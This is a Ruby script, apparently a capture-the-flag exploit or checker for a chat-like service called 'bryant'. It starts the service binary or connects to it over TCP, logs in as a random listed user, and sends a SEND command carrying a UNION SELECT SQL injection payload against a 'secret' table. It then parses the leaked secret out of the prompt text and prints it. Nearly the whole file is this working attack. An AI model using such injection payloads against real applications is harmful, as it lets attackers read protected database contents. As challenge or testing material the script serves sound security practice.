#!/bin/env ruby

require "expect"
require "logger"
require "securerandom"

LLL = Logger.new(STDERR,
                 formatter: proc do |sev, datetime, progname, msg|
                   "#{sev}: #{msg}\n"
                 end)

def die(*messages)
  LLL.fatal *messages
  exit -1
end

host = ENV['HOST']
port = ENV['PORT'].to_i

bryant_in = nil
bryant_out = nil
wait_thread = nil

if host.nil?
  LLL.info "launching myself"

  bin_path = ENV['BIN_PATH']

  if bin_path.nil?
    bin_path = File.absolute_path("../build/bryant", __dir__)
  end

  LLL.info "starting #{bin_path}"

  require "open3"
  bryant_in, bryant_out, bryant_err, wait_thread = Open3.popen3(bin_path)

  Thread.new do
    loop do
      begin
        got = bryant_err.read 80
        LLL.info "stderr: #{got}"
      rescue IO::WaitReadable
      end
    end
  end
else
  puts "connecting to #{host}:#{port}"
  require "socket"

  sock = TCPSocket.new host, port
  sock.setsockopt(Socket::IPPROTO_TCP, Socket::TCP_NODELAY, true)
  bryant_in = sock
  bryant_out = sock
end

bryant_out.expect(%r{bryant\> }, timeout=5) or die("didn't get initial prompt")
LLL.info "listing users"
bryant_in.puts "LIST"
got = bryant_out.expect("bryant> ").join
LLL.debug got
users = got.lines[0..-2]
my_user = users.sample
LLL.info "logging in as #{my_user}"
bryant_in.puts "LOGIN #{my_user}"
bryant_out.expect "bryant> "
LLL.info "sending spike..."
bryant_in.puts "SEND #{SecureRandom.alphanumeric}' AND 'abc'='def' UNION SELECT * FROM secret; --"
got = bryant_out.expect(":\n").join
md = /enter message to (.+):$/.match got
LLL.info "found secret #{md[1]}"
$stderr.puts md[1]
